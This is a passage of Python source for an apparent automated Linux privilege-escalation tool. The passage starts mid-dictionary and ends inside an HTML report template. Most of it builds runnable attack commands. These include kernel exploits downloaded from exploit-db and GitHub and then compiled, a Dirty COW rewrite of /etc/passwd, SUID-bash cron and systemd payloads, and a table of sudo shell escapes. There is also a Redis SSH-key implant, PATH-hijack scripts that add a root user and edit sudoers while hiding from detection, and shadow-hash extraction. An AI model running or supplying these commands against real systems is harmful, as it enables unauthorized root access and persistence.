            'CVE-2016-5195': 'wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c && gcc -pthread dirtyc0w.c -o dirtyc0w && ./dirtyc0w /etc/passwd "root:$6$P0MXvbYN$ND4GTdJ0VVidQNTsDZ8q9RjTpsXZP0ti/y0WICLaFSFTFVZh71lo16NKRuN7kVUvGw6QfTSjyQYSQ5AwmWR1C.:0:0:root:/root:/bin/bash" 2>/dev/null',
            'CVE-2012-0056': 'wget https://www.exploit-db.com/download/18411 -O mempodipper.c && gcc mempodipper.c -o mempodipper && ./mempodipper',
            'CVE-2015-1328': 'wget https://www.exploit-db.com/download/37292 -O ofs_exploit.c && gcc ofs_exploit.c -o ofs_exploit && ./ofs_exploit',
            'CVE-2017-16995': 'wget https://www.exploit-db.com/download/45010 -O kernel_exploit.c && gcc kernel_exploit.c -o kernel_exploit && ./kernel_exploit',
            'CVE-2017-1000112': 'wget https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c -O cve_1000112.c && gcc cve_1000112.c -o cve_1000112 && ./cve_1000112',
            'CVE-2017-7308': 'wget https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c -O packet_set_ring.c && gcc packet_set_ring.c -o packet_set_ring && ./packet_set_ring',
            'CVE-2022-2586': 'wget https://raw.githubusercontent.com/theori-io/CVE-2022-2586/main/exploit.c -O nft_object_uaf.c && gcc -Wall nft_object_uaf.c -o nft_object_uaf && ./nft_object_uaf'
        }
        
        for vuln in vulns:
            cve = vuln.get('cve')
            kernel_version = vuln.get('kernel_version')
            
            if cve in kernel_exploit_scripts:
                exploit = {
                    'type': 'kernel_exploit',
                    'vulnerability': vuln,
                    'command': kernel_exploit_scripts[cve],
                    'description': f"Exploit kernel vulnerability {cve} in version {kernel_version}"
                }
                
                self.logger.log(LogLevel.SUCCESS, f"Generated exploit for kernel vulnerability {cve}")
                self.logger.log(LogLevel.INFO, f"  Kernel version: {kernel_version}")
                
                exploits.append(exploit)
        
        return exploits
    
    def exploit_writable_cron_job(self, vulns):
        """Generate exploits for writable cron job vulnerabilities"""
        exploits = []
        
        for vuln in vulns:
            file_path = vuln.get('path')
            
            exploit = {
                'type': 'writable_cron_job',
                'vulnerability': vuln,
                'command': f"echo '* * * * * root chmod +s /bin/bash' > {file_path}",
                'description': f"Modify cron job {file_path} to make /bin/bash SUID"
            }
            
            self.logger.log(LogLevel.SUCCESS, f"Generated exploit for writable cron job")
            self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
            
            exploits.append(exploit)
        
        return exploits
    
    def exploit_writable_cron_file(self, vulns):
        """Generate exploits for writable cron file vulnerabilities"""
        return self.exploit_writable_cron_job(vulns)
    
    def exploit_writable_systemd_timer(self, vulns):
        """Generate exploits for writable systemd timer vulnerabilities"""
        exploits = []
        
        for vuln in vulns:
            file_path = vuln.get('path')
            timer_name = vuln.get('timer_name')
            
            exploit = {
                'type': 'writable_systemd_timer',
                'vulnerability': vuln,
                'command': f"echo '[Service]\\nExecStart=/bin/sh -c \"chmod +s /bin/bash\"\\n[Install]\\nWantedBy=multi-user.target' > {file_path}",
                'description': f"Modify systemd timer {timer_name} to make /bin/bash SUID"
            }
            
            self.logger.log(LogLevel.SUCCESS, f"Generated exploit for writable systemd timer")
            self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
            
            exploits.append(exploit)
        
        return exploits
    
    def exploit_dangerous_sudo_permission(self, vulns):
        """Generate exploits for dangerous sudo permission vulnerabilities"""
        exploits = []
        
        # Map of sudo commands to their exploits
        sudo_exploits = {
            'ALL': 'sudo su -',
            'NOPASSWD': 'sudo su -',
            'ALL : ALL': 'sudo su -',
            '(ALL)': 'sudo su -',
            '(ALL : ALL)': 'sudo su -',
            'vim': 'sudo vim -c ":py import os; os.execl(\'/bin/sh\', \'sh\', \'-c\', \'reset; exec sh\')"',
            'vi': 'sudo vi -c ":!sh"',
            'nano': 'sudo nano -s /bin/sh',
            'less': 'sudo less /etc/passwd\\n!/bin/sh',
            'more': 'sudo more /etc/passwd\\n!/bin/sh',
            'man': 'sudo man man\\n!/bin/sh',
            'find': 'sudo find / -name test -exec /bin/sh \\;',
            'cp': 'sudo cp /bin/bash /tmp/bash && sudo chmod +s /tmp/bash && /tmp/bash -p',
            'mv': 'TF=$(mktemp) && echo \'privesc:$1$privesc$ntahyRpAsDmjy6nDyXO7f/:0:0:root:/root:/bin/bash\' > $TF && sudo mv $TF /etc/passwd',
            'perl': 'sudo perl -e \'exec "/bin/sh";\'',
            'python': 'sudo python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
            'ruby': 'sudo ruby -e \'exec "/bin/sh"\'',
            'php': 'sudo php -r \'system("/bin/sh");\'',
            'bash': 'sudo bash',
            'sh': 'sudo sh',
            'ksh': 'sudo ksh',
            'zsh': 'sudo zsh',
            'nmap': 'echo "os.execute(\'/bin/sh\')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse',
            'netcat': 'sudo netcat -c sh 127.0.0.1 9999',
            'nc': 'sudo nc -c sh 127.0.0.1 9999',
            'awk': 'sudo awk \'BEGIN {system("/bin/sh")}\'',
            'sed': 'sudo sed -n "1e /bin/sh" /etc/hosts',
            'tee': 'echo "privesc::0:0::/:/bin/sh" | sudo tee -a /etc/passwd',
            'cat': 'LFILE=/etc/passwd && echo "privesc::0:0::/:/bin/sh" | sudo tee -a $LFILE',
            'chmod': 'sudo chmod +s /bin/bash',
            'chown': 'sudo chown $(id -u):$(id -g) /etc/shadow',
            'dd': 'echo "privesc::0:0::/:/bin/sh" | sudo dd of=/etc/passwd oflag=append conv=notrunc',
            'docker': 'sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh',
            'crontab': 'sudo echo "* * * * * root chmod +s /bin/bash" | sudo tee /etc/cron.d/privesc',
            'tcpdump': 'COMMAND="id" && TF=$(mktemp) && echo "$COMMAND" > $TF && chmod +x $TF && sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF',
            'dpkg': 'sudo dpkg --fsys-tarfile /var/cache/apt/archives/bash_*.deb | tar xf - ./bin/bash && ./bin/bash',
            'apt': 'sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh',
            'yum': 'sudo yum update -q -y --security --cve CVE-2014-6271',
            'snap': 'sudo snap install --dangerous --devmode malicious.snap',
            'pip': 'TF=$(mktemp -d) && echo "import os; os.execl(\'/bin/sh\', \'sh\', \'-p\')" > $TF/setup.py && cd $TF && sudo pip install .',
            'tar': 'sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',
            'zip': 'TF=$(mktemp -d) && sudo zip $TF/x.zip $TF/ -T --unzip-command="sh -c /bin/sh"',
            'gzip': 'sudo gzip -f /etc/passwd -t',
            'git': 'sudo git help status\\n!/bin/sh'
        }
        
        for vuln in vulns:
            cmd = vuln.get('command')
            sudo_output = vuln.get('sudo_output', '')
            
            if cmd in sudo_exploits:
                exploit = {
                    'type': 'dangerous_sudo_permission',
                    'vulnerability': vuln,
                    'command': sudo_exploits[cmd],
                    'description': f"Exploit sudo permission for {cmd} to gain root access"
                }
                
                self.logger.log(LogLevel.SUCCESS, f"Generated exploit for sudo permission: {cmd}")
                self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
                
                exploits.append(exploit)
        
        return exploits
    
    def exploit_exposed_service(self, vulns):
        """Generate exploits for exposed service vulnerabilities"""
        exploits = []
        
        for vuln in vulns:
            port = vuln.get('port')
            service = vuln.get('service')
            address = vuln.get('address')
            
            # Create an exploit based on the service
            if service == 'MySQL':
                exploit = {
                    'type': 'exposed_mysql',
                    'vulnerability': vuln,
                    'command': f"mysql -h {address} -P {port} -u root -p",
                    'description': f"Connect to MySQL service on {address}:{port} (try empty password or common passwords)"
                }
                
                self.logger.log(LogLevel.SUCCESS, f"Generated exploit for exposed MySQL service")
                self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
                
                exploits.append(exploit)
            
            elif service == 'Redis':
                exploit = {
                    'type': 'exposed_redis',
                    'vulnerability': vuln,
                    'command': f"redis-cli -h {address} -p {port} config set dir /root/.ssh/\nredis-cli -h {address} -p {port} config set dbfilename \"authorized_keys\"\nredis-cli -h {address} -p {port} set crackit \"\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7H+n1VuQOW7pJ17EPR4bxW3TnKpNZxKRPX9nd9J0UM9qVN4itUFgx0zFSyKwtQFptBR9uJqRXKkR0yrqCqWV+i8k0YKmjVK5IQKdGD3+GRk2shO1xAOsJJzKYQJzWkA/SxhGnb6VJFgV96NDuZBCQQxqQpqoXjYqKDnIs4+Tz/z9HSP1t0I2MnGIWk1PWozsldkGmO8qNLKPmRnFu2PSSxoVykdYqFGkkpMWuJgMWYnaupIICfs12D6td9VI6QnzCpsCxYE/jaVKoxs+U7EKBQpMmI5Owt9GO8IgYLba4KdAhHQi/C957pXECONGWqnCnpTDLkxUOmh2YVrGDgjkxq5IIyEQHO+ut5vOHyhONXM4PnTSEnSwpKKD9+1JCbQnFpFLdFPfZkNcXbTM6XUEWbG1e2jzxPq7bVZRZZfIXwMnIaKwUCJuoK422kX+ygZbKJfLV3d00ETFBr5FdXEe/XEHiua5aRHMyTB4Wg3kTSzQihLOzQJjJ59yIVKU= privesc-key\\n\\n\"\nredis-cli -h {address} -p {port} save",
                    'description': f"Exploit Redis on {address}:{port} to write SSH key to authorized_keys"
                }
                
                self.logger.log(LogLevel.SUCCESS, f"Generated exploit for exposed Redis service")
                self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
                
                exploits.append(exploit)
            
            elif service == 'MongoDB':
                exploit = {
                    'type': 'exposed_mongodb',
                    'vulnerability': vuln,
                    'command': f"mongo --host {address} --port {port}",
                    'description': f"Connect to MongoDB service on {address}:{port} (try without authentication)"
                }
                
                self.logger.log(LogLevel.SUCCESS, f"Generated exploit for exposed MongoDB service")
                self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
                
                exploits.append(exploit)
                
            elif service in ['HTTP', 'HTTP-Proxy', 'HTTPS']:
                exploit = {
                    'type': 'exposed_web',
                    'vulnerability': vuln,
                    'command': f"curl -v http://{address}:{port}/",
                    'description': f"Check for web application vulnerabilities on {address}:{port}"
                }
                
                self.logger.log(LogLevel.SUCCESS, f"Generated exploit for exposed web service")
                self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
                
                exploits.append(exploit)
        
        return exploits
    
    def exploit_writable_path_directory(self, vulns):
        """Generate exploits for writable directory in PATH vulnerabilities"""
        exploits = []
        
        # Common commands that might be run by root
        common_commands = ['ls', 'cat', 'cp', 'mv', 'chmod', 'chown', 'find', 'grep']
        
        for vuln in vulns:
            directory = vuln.get('path')
            
            for cmd in common_commands:
                exploit = {
                    'type': 'path_hijacking',
                    'vulnerability': vuln,
                    'command': f"echo '#!/bin/bash\\nchmod +s /bin/bash' > {os.path.join(directory, cmd)} && chmod +x {os.path.join(directory, cmd)}",
                    'description': f"Create a malicious {cmd} binary in {directory} (which is in PATH) to escalate privileges"
                }
                
                self.logger.log(LogLevel.SUCCESS, f"Generated PATH hijacking exploit for {cmd}")
                self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
                
                exploits.append(exploit)
                
                # Only add one example to avoid flooding
                break
        
        return exploits
    
    def verify_path_hijacking_vulnerability(self, path, command):
        """
        Verify that a path hijacking vulnerability is actually exploitable
        
        Args:
            path (str): The writable directory in PATH
            command (str): The command to hijack
            
        Returns:
            tuple: (is_exploitable, reason, details)
        """
        self.logger.log(LogLevel.INFO, f"Verifying path hijacking vulnerability for {command} in {path}...")
        
        try:
            # Check if the directory exists and is in PATH
            if not os.path.exists(path) or not os.path.isdir(path):
                return False, "Directory does not exist", {}
                
            # Check if we have write permissions to the directory
            if not os.access(path, os.W_OK):
                return False, "No write permissions to directory", {}
            
            # Get the PATH environment variable and parse it
            env_path = os.environ.get('PATH', '')
            path_dirs = env_path.split(':')
            
            # Check if our directory is in PATH
            if path not in path_dirs:
                return False, "Directory not in PATH", {"path_dirs": path_dirs}
            
            # Try to find where the real command is located
            real_path = None
            try:
                real_path = subprocess.check_output(['which', command], 
                                                stderr=subprocess.DEVNULL).decode().strip()
            except subprocess.CalledProcessError:
                # Command doesn't exist, which is actually good for us
                pass
                
            if real_path:
                real_dir = os.path.dirname(real_path)
                # Find indices in PATH
                our_dir_index = path_dirs.index(path)
                real_dir_index = next((i for i, p in enumerate(path_dirs) if p == real_dir), -1)
                
                # Our directory needs to come BEFORE the real binary in PATH
                if real_dir_index != -1 and our_dir_index >= real_dir_index:
                    return False, f"Directory {path} comes after real binary in PATH", {
                        "our_index": our_dir_index,
                        "real_index": real_dir_index,
                        "path_dirs": path_dirs
                    }
            
            # All checks passed
            return True, "Path hijacking vulnerability verified", {
                "path": path,
                "command": command
            }
            
        except Exception as e:
            self.logger.log(LogLevel.ERROR, f"Error verifying path hijacking: {e}")
            return False, f"Verification error: {str(e)}", {"error": str(e)}
    
    def exploit_path_hijacking(self, vulns):
        """Generate smarter exploits for PATH hijacking vulnerabilities"""
        exploits = []
        
        # First check if we have writable directories in PATH
        writable_path_dirs = [v for v in self.vulnerabilities if v.get('type') == 'writable_path_directory']
        
        if not writable_path_dirs:
            self.logger.log(LogLevel.WARNING, "PATH hijacking vulnerabilities found, but no writable directories in PATH")
            return exploits
        
        for vuln in vulns:
            cmd = vuln.get('command')
            
            # Use the first writable directory
            directory = writable_path_dirs[0].get('path')
            
            # Verify this is an actual exploitable vector
            is_exploitable, reason, details = self.verify_path_hijacking_vulnerability(directory, cmd)
            
            if not is_exploitable:
                self.logger.log(LogLevel.WARNING, f"Path hijacking for {cmd} may not be exploitable: {reason}")
                continue
            
            # Generate different approaches based on the command and environment
            exploits_for_cmd = self._generate_path_hijacking_approaches(directory, cmd, details)
            
            for approach in exploits_for_cmd:
                self.logger.log(LogLevel.SUCCESS, f"Generated PATH hijacking exploit for {cmd}")
                self.logger.log(LogLevel.INFO, f"  Command: {approach['command']}")
                self.logger.log(LogLevel.INFO, f"  {approach['description']}")
                
                exploits.append(approach)
        
        return exploits

    def _generate_path_hijacking_approaches(self, directory, command, details):
        """
        Generate multiple approaches for path hijacking
        
        Args:
            directory (str): Writable directory in PATH
            command (str): Command to hijack
            details (dict): Details from vulnerability verification
            
        Returns:
            list: List of exploit approaches
        """
        approaches = []
        filepath = os.path.join(directory, command)
        timestamp = int(time.time())
        
        # Approach 1: Create a copy of bash with SUID bit
        bash_copy_script = f"""#!/bin/bash
    # Path hijacking exploit for {command}
    # Created by Advanced Linux Privilege Escalation Tool

    # Create a copy of bash with SUID permissions
    cp /bin/bash /tmp/.privbash-{timestamp}
    chmod 4755 /tmp/.privbash-{timestamp}

    # Leave evidence of successful execution
    echo "[+] Privilege escalation successful via {command} path hijacking at $(date)" > /tmp/.privesc-success-{timestamp}

    # Run the original command to avoid detection
    {command} "$@"
    """
        
        approaches.append({
            'type': 'path_hijacking_bash_copy',
            'vulnerability': {'type': 'path_hijacking', 'command': command, 'path': directory},
            'command': f"echo '{bash_copy_script}' > {filepath} && chmod +x {filepath}",
            'description': f"Create a malicious {command} binary in {directory} that will create a SUID bash copy",
            'usage': "After a privileged user runs this command, check /tmp/ for .privbash-* files and execute with -p flag",
            'evidence_file': f"/tmp/.privesc-success-{timestamp}"
        })
        
        # Approach 2: Add a new root user to /etc/passwd
        add_user_script = f"""#!/bin/bash
    # Path hijacking exploit for {command}
    # Created by Advanced Linux Privilege Escalation Tool

    # Try to add a new root user
    echo 'privesc::0:0::/root:/bin/bash' >> /etc/passwd
    echo "privesc:$(openssl passwd -1 -salt xyz privesc123):0:0::/root:/bin/bash" >> /etc/passwd 2>/dev/null

    # Leave evidence of successful execution
    echo "[+] User added via {command} path hijacking at $(date)" > /tmp/.privesc-useradd-{timestamp}

    # Run the original command to avoid detection
    {command} "$@"
    """
        
        approaches.append({
            'type': 'path_hijacking_add_user',
            'vulnerability': {'type': 'path_hijacking', 'command': command, 'path': directory},
            'command': f"echo '{add_user_script}' > {filepath} && chmod +x {filepath}",
            'description': f"Create a malicious {command} that will add a new root user to /etc/passwd",
            'usage': "After a privileged user runs this command, try 'su privesc' with password 'privesc123'",
            'evidence_file': f"/tmp/.privesc-useradd-{timestamp}"
        })
        
        # Approach 3: Use sudo to create a SUID binary (more versatile than reverse shell)
        sudo_exploit_script = f"""#!/bin/bash
    # Path hijacking exploit for {command}
    # Created by Advanced Linux Privilege Escalation Tool

    # Try to use sudo to create a SUID binary
    echo '#!/bin/bash
    if [ $(id -u) -eq 0 ]; then
        cp /bin/bash /tmp/.rootshell-{timestamp}
        chmod 4755 /tmp/.rootshell-{timestamp}
        echo "Root shell created at /tmp/.rootshell-{timestamp}"
    fi' > /tmp/.sudoscript-{timestamp}
    chmod +x /tmp/.sudoscript-{timestamp}

    # Try various privilege escalation techniques silently
    sudo /tmp/.sudoscript-{timestamp} 2>/dev/null || true
    sudo -n /tmp/.sudoscript-{timestamp} 2>/dev/null || true

    # Try to modify sudoers file
    echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers 2>/dev/null || true

    # Leave evidence of execution attempt
    echo "[+] Sudo exploitation attempt via {command} path hijacking at $(date)" > /tmp/.privesc-sudo-{timestamp}

    # Run the original command to avoid detection
    {command} "$@"
    """
        
        approaches.append({
            'type': 'path_hijacking_sudo_exploit',
            'vulnerability': {'type': 'path_hijacking', 'command': command, 'path': directory},
            'command': f"echo '{sudo_exploit_script}' > {filepath} && chmod +x {filepath}",
            'description': f"Create a malicious {command} that tries various sudo techniques to gain root access",
            'usage': "After a privileged user runs this command, check /tmp/ for .rootshell-* files or try 'sudo -l'",
            'evidence_file': f"/tmp/.privesc-sudo-{timestamp}"
        })
        
        return approaches
    
    def exploit_readable_shadow_file(self, vulns):
        """Generate exploits for readable shadow file vulnerabilities"""
        exploits = []
        
        for vuln in vulns:
            exploit = {
                'type': 'readable_shadow',
                'vulnerability': vuln,
                'command': "cat /etc/shadow | grep -v '^[^:]*:\\*\\|^[^:]*:!' | awk -F: '{print $1 \":\" $2}' > /tmp/hashes.txt && echo 'These password hashes can be cracked offline with tools like hashcat or john'",
                'description': "Extract password hashes from the shadow file for offline cracking"
            }
            
            self.logger.log(LogLevel.SUCCESS, "Generated exploit for readable shadow file")
            self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
            
            exploits.append(exploit)
        
        return exploits
    
    def check_path_hijacking_success(self):
        """
        Check if any path hijacking exploits have been successful
        
        Returns:
            tuple: (success, message, evidence_files)
        """
        self.logger.log(LogLevel.INFO, "Checking for evidence of successful path hijacking exploits...")
        
        evidence_files = {}
        
        # Check for success evidence files
        try:
            for file in glob.glob("/tmp/.privesc-*"):
                if os.path.exists(file) and os.access(file, os.R_OK):
                    with open(file, 'r') as f:
                        content = f.read()
                        evidence_files[file] = content
                        self.logger.log(LogLevel.SUCCESS, f"Found evidence file: {file}")
                        self.logger.log(LogLevel.INFO, f"Content: {content}")
        except Exception as e:
            self.logger.log(LogLevel.ERROR, f"Error checking for evidence files: {e}")
        
        # Check for SUID bash copies
        suid_shells = []
        try:
            for shell_pattern in ["/tmp/.privbash-*", "/tmp/.rootshell-*"]:
                for shell in glob.glob(shell_pattern):
                    if os.path.exists(shell):
                        try:
                            file_stat = os.stat(shell)
                            if file_stat.st_mode & stat.S_ISUID:
                                suid_shells.append(shell)
                                self.logger.log(LogLevel.SUCCESS, f"Found SUID shell: {shell}")
                        except Exception:
                            pass
        except Exception as e:
            self.logger.log(LogLevel.ERROR, f"Error checking for SUID shells: {e}")
        
        # Check if a new root user was added
        new_user_added = False
        try:
            with open('/etc/passwd', 'r') as f:
                passwd_content = f.read()
                if 'privesc:' in passwd_content:
                    new_user_added = True
                    self.logger.log(LogLevel.SUCCESS, "New root user 'privesc' added to /etc/passwd!")
        except Exception:
            pass
        
        # Check for sudo privileges
        sudo_access = False
        try:
            sudo_output = subprocess.run(['sudo', '-l'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=1)
            if sudo_output.returncode == 0 and 'NOPASSWD: ALL' in sudo_output.stdout.decode():
                sudo_access = True
                self.logger.log(LogLevel.SUCCESS, "User has NOPASSWD sudo privileges!")
        except Exception:
            pass
        
        # Determine success based on evidence
        if suid_shells:
            return True, f"Path hijacking was successful! Found {len(suid_shells)} SUID shell(s)", {
                "suid_shells": suid_shells,
                "evidence_files": evidence_files,
                "usage": f"Execute '{suid_shells[0]} -p' to get a privileged shell"
            }
        elif new_user_added:
            return True, "Path hijacking was successful! New root user 'privesc' added", {
                "new_user": "privesc",
                "password": "privesc123",
                "evidence_files": evidence_files,
                "usage": "Run 'su privesc' with password 'privesc123'"
            }
        elif sudo_access:
            return True, "Path hijacking was successful! User has sudo privileges", {
                "evidence_files": evidence_files,
                "usage": "Run 'sudo su -' to get a root shell"
            }
        elif evidence_files:
            return True, "Found evidence of path hijacking execution, but no privilege escalation confirmed", {
                "evidence_files": evidence_files
            }
        else:
            return False, "No evidence of successful path hijacking found", {}
        
    def monitor_for_path_hijacking_success(self, timeout=300):
        """
        Monitor for evidence of successful path hijacking exploits
        
        Args:
            timeout (int): Maximum monitoring time in seconds
            
        Returns:
            tuple: (success, message, evidence)
        """
        self.logger.log(LogLevel.INFO, f"Monitoring for path hijacking success for {timeout} seconds...")
        
        start_time = time.time()
        check_interval = 5  # seconds
        
        # Initial check
        success, message, evidence = self.check_path_hijacking_success()
        if success:
            return success, message, evidence
        
        while time.time() - start_time < timeout:
            time.sleep(check_interval)
            
            # Print a status update every minute
            elapsed = int(time.time() - start_time)
            if elapsed % 60 == 0 and elapsed > 0:
                self.logger.log(LogLevel.INFO, f"Still monitoring... {elapsed} seconds elapsed")
            
            # Check for success
            success, message, evidence = self.check_path_hijacking_success()
            if success:
                return success, message, evidence
        
        # Timeout reached
        return False, f"Monitoring timed out after {timeout} seconds", {}

class ReportGenerator:
    def __init__(self, logger, system_info, vulnerabilities, exploits):
        self.logger = logger
        self.system_info = system_info
        self.vulnerabilities = vulnerabilities
        self.exploits = exploits
        self.report_data = {}
    
    def generate_report(self, output_format='all', output_file=None):
        """Generate a report of the scan results"""
        self.logger.log(LogLevel.INFO, "Generating report...")
        
        # Prepare report data
        self.report_data = {
            'scan_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'system_info': self.system_info,
            'vulnerabilities': self.vulnerabilities,
            'exploits': self.exploits,
            'summary': {
                'total_vulnerabilities': len(self.vulnerabilities),
                'total_exploits': len(self.exploits),
                'vulnerability_types': {},
                'exploit_types': {}
            }
        }
        
        # Count vulnerability types
        for vuln in self.vulnerabilities:
            vuln_type = vuln.get('type', 'unknown')
            if vuln_type not in self.report_data['summary']['vulnerability_types']:
                self.report_data['summary']['vulnerability_types'][vuln_type] = 0
            self.report_data['summary']['vulnerability_types'][vuln_type] += 1
        
        # Count exploit types
        for exploit in self.exploits:
            exploit_type = exploit.get('type', 'unknown')
            if exploit_type not in self.report_data['summary']['exploit_types']:
                self.report_data['summary']['exploit_types'][exploit_type] = 0
            self.report_data['summary']['exploit_types'][exploit_type] += 1
        
        # Generate report in the specified format
        if output_format == 'json' or output_format == 'all':
            self.generate_json_report(output_file)
        
        if output_format == 'text' or output_format == 'all':
            self.generate_text_report(output_file)
        
        if output_format == 'html' or output_format == 'all':
            self.generate_html_report(output_file)
        
        return self.report_data
    
    def generate_json_report(self, output_file=None):
        """Generate a JSON report"""
        json_report = json.dumps(self.report_data, indent=4)
        
        if output_file:
            file_name = f"{output_file}.json" if not output_file.endswith('.json') else output_file
            with open(file_name, 'w') as f:
                f.write(json_report)
            self.logger.log(LogLevel.SUCCESS, f"JSON report saved to {file_name}")
        
        return json_report
    
    def generate_text_report(self, output_file=None):
        """Generate a text report"""
        report_lines = []
        
        # Add header
        report_lines.append("=" * 80)
        report_lines.append(f"Advanced Linux Privilege Escalation Report")
        report_lines.append(f"Scan Time: {self.report_data['scan_time']}")
        report_lines.append("=" * 80)
        report_lines.append("")
        
        # Add system information
        report_lines.append("SYSTEM INFORMATION")
        report_lines.append("-" * 80)
        system_info = self.report_data['system_info']
        for key, value in system_info.items():
            if isinstance(value, dict) or isinstance(value, list) or '\n' in str(value):
                report_lines.append(f"{key.replace('_', ' ').title()}:")
                
                if isinstance(value, dict):
                    for k, v in value.items():
                        if k == 'environment':
                            continue  # Skip environment variables to reduce verbosity
                        if not str(v).strip():
                            continue
                        report_lines.append(f"  {k}: {v}")
                elif isinstance(value, list):
                    for item in value:
                        report_lines.append(f"  {item}")
                else:
                    for line in str(value).split('\n'):
                        if line.strip():
                            report_lines.append(f"  {line}")
            else:
                report_lines.append(f"{key.replace('_', ' ').title()}: {value}")
        report_lines.append("")
        
        # Add summary
        report_lines.append("SUMMARY")
        report_lines.append("-" * 80)
        report_lines.append(f"Total Vulnerabilities: {self.report_data['summary']['total_vulnerabilities']}")
        report_lines.append(f"Total Exploits: {self.report_data['summary']['total_exploits']}")
        report_lines.append("")
        
        # Add vulnerability types summary
        report_lines.append("Vulnerability Types:")
        for vuln_type, count in self.report_data['summary']['vulnerability_types'].items():
            report_lines.append(f"  {vuln_type.replace('_', ' ').title()}: {count}")
        report_lines.append("")
        
        # Add exploit types summary
        report_lines.append("Exploit Types:")
        for exploit_type, count in self.report_data['summary']['exploit_types'].items():
            report_lines.append(f"  {exploit_type.replace('_', ' ').title()}: {count}")
        report_lines.append("")
        
        # Add vulnerabilities
        report_lines.append("VULNERABILITIES DETAILS")
        report_lines.append("-" * 80)
        for i, vuln in enumerate(self.report_data['vulnerabilities'], 1):
            vuln_type = vuln.get('type', 'unknown').replace('_', ' ').title()
            report_lines.append(f"[{i}] {vuln_type}")
            
            for key, value in vuln.items():
                if key == 'type':
                    continue  # Already displayed above
                
                if isinstance(value, dict) or isinstance(value, list):
                    report_lines.append(f"  {key.replace('_', ' ').title()}:")
                    
                    if isinstance(value, dict):
                        for k, v in value.items():
                            report_lines.append(f"    {k}: {v}")
                    elif isinstance(value, list):
                        for item in value:
                            report_lines.append(f"    {item}")
                else:
                    report_lines.append(f"  {key.replace('_', ' ').title()}: {value}")
            
            report_lines.append("")  # Add a blank line between vulnerabilities

        # Add verification information
        if 'verification_reason' in vuln:
            verification_status = "Verified" if vuln.get('is_exploitable', False) else "Verification Failed"
            report_lines.append(f"  Verification: {verification_status} - {vuln.get('verification_reason')}")
        
        # Add exploits
        report_lines.append("EXPLOITS DETAILS")
        report_lines.append("-" * 80)
        for i, exploit in enumerate(self.report_data['exploits'], 1):
            exploit_type = exploit.get('type', 'unknown').replace('_', ' ').title()
            report_lines.append(f"[{i}] {exploit_type}")
            report_lines.append(f"  Description: {exploit.get('description', 'No description')}")
            report_lines.append(f"  Command: {exploit.get('command', 'No command')}")
            report_lines.append("")  # Add a blank line between exploits
        
        # Add footer
        report_lines.append("=" * 80)
        report_lines.append("End of Report")
        report_lines.append("=" * 80)
        
        text_report = "\n".join(report_lines)
        
        if output_file:
            file_name = f"{output_file}.txt" if not output_file.endswith('.txt') else output_file
            with open(file_name, 'w') as f:
                f.write(text_report)
            self.logger.log(LogLevel.SUCCESS, f"Text report saved to {file_name}")
        
        return text_report
    
    def generate_html_report(self, output_file=None):
        """Generate a professional HTML report"""
        # Read the report template
        html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Privilege Escalation Assessment Report</title>
    <style>
        :root {
            --primary-color: #2c3e50;
            --secondary-color: #34495e;
            --accent-color: #3498db;
            --success-color: #27ae60;
            --warning-color: #f39c12;
            --danger-color: #e74c3c;
            --light-color: #ecf0f1;
            --dark-color: #2c3e50;
            --font-main: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            font-family: var(--font-main);
            line-height: 1.6;
            margin: 0;
            padding: 0;
            color: #333;
            background-color: #f8f9fa;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            background-color: var(--primary-color);
            color: white;
            padding: 30px;
            border-radius: 5px;
            margin-bottom: 30px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        
        .header h1 {
            margin: 0;
            font-size: 28px;
            font-weight: 600;
        }
        
        .header p {
            margin: 10px 0 0;
            opacity: 0.9;
        }
        
        .section {
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            margin-bottom: 30px;
            overflow: hidden;
        }
        
        .section-header {
            background-color: var(--secondary-color);
            color: white;
            padding: 15px 20px;
            font-size: 18px;
            font-weight: 600;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .section-content {
            padding: 20px;
        }
        
        .executive-summary {
            background-color: #f8f9fa;
            border-left: 4px solid var(--accent-color);
            padding: 15px;
            margin-bottom: 20px;
        }
        
        .risk-summary {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .risk-box {
            flex: 1;
            min-width: 200px;
            padding: 15px;
            border-radius: 5px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            text-align: center;
        }
        
        .risk-high {
            background-color: rgba(231, 76, 60, 0.1);
            border-left: 4px solid var(--danger-color);
        }
        
        .risk-medium {
            background-color: rgba(243, 156, 18, 0.1);
            border-left: 4px solid var(--warning-color);
        }
        
        .risk-low {
            background-color: rgba(39, 174, 96, 0.1);
            border-left: 4px solid var(--success-color);
        }
        
        .risk-box h3 {
            margin-top: 0;
            color: var(--dark-color);
        }
        
        .risk-box .count {
            font-size: 24px;
            font-weight: bold;
